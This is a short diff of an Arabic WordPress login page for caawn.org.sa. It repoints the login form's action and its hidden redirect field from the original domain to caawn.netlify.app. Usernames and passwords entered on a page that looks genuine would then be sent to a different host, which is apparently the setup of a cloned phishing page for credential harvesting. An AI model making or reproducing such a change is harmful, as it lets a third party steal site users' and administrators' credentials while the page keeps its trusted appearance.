@@ -31,7 +31,7 @@ document.body.className = document.body.className.replace('no-js','js');
 			<div id="login">
 		<h1 role="presentation" class="wp-login-logo"><a href="https://ar.wordpress.org/">يعمل بواسطة ووردبريس</a></h1>
 	
-		<form name="loginform" id="loginform" action="https://caawn.org.sa/wp-login.php" method="post">
+		<form name="loginform" id="loginform" action="https://caawn.netlify.app/wp-login.php" method="post">
 			<p>
 				<label for="user_login">اسم المستخدم أو البريد الإلكتروني</label>
 				<input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
@@ -78,7 +78,7 @@ if ( typeof wpOnload === 'function' ) { wpOnload() }
 					<select name="wp_lang" id="language-switcher-locales"><option value="en_US" lang="en" data-installed="1">English (United States)</option>
 <option value="ar" lang="ar" selected='selected' data-installed="1">العربية</option></select>
 					
-											<input type="hidden" name="redirect_to" value="https://caawn.org.sa/wp-admin/&reauth=1" />
+											<input type="hidden" name="redirect_to" value="https://caawn.netlify.app/wp-admin/&reauth=1" />
 					
 					
 						<input type="submit" class="button" value="تغيير">
